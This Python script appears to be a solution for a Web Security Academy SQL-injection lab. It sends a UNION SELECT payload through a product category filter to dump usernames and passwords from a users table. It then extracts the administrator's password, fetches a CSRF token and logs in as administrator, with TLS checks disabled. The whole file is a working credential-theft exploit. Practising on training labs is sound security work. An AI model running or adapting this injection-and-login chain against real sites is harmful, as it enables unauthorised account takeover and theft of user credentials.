import urllib3
import requests
import bs4

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def check_wrong_login(text):
    soup = bs4.BeautifulSoup(text, "html.parser")
    error_tag = soup.find('p', class_="is-warning")
    if error_tag:
        error = error_tag.get_text().strip()
    else:
        error = None
    if error == "Invalid username or password.":
        return False
    return True


def csrf_getter(session, url):
    resp = session.get(url, verify=False)
    soup = bs4.BeautifulSoup(resp.text, "html.parser")
    token_input = soup.find("input", {"name": "csrf"})
    if not token_input or not token_input.get("value"):
        raise ValueError("Unable to find CSRF token on login page")
    return token_input["value"]


def main():
    host = "https://0a06006504534b03829c161200ad0061.web-security-academy.net"
    product_url = f'{host}/filter?category=Accessories'
    comment = "--"
    apostrophe = "'"
    space = " "
    union = "UNION"
    select = "SELECT"
    tableName = "users"
    columnsName = "username, password"
    payload = apostrophe + space + union + space + select + space + columnsName + space + "FROM" + space + tableName+comment

    session = requests.Session()
    response = session.get(product_url + payload, verify=False)
    soup = bs4.BeautifulSoup(response.text, "html.parser")

    admin_th = soup.find('th', string="administrator")
    if admin_th:   
        password = admin_th.find_next_sibling('td').get_text()
        print(f"Koated !!! administrator password is: {password}")
    else:
        print("Failed to find administrator credentials.")

    login_url = f'{host}/login'
    csrf = csrf_getter(session, login_url)
    creds = {"csrf": csrf, "username": "administrator", "password": password}
    r = session.post(login_url, data=creds, verify=False)
    
    if check_wrong_login(r.text):
        print("Koated !!")
    else:
        print("ya siks")


if __name__ == "__main__":
    main()




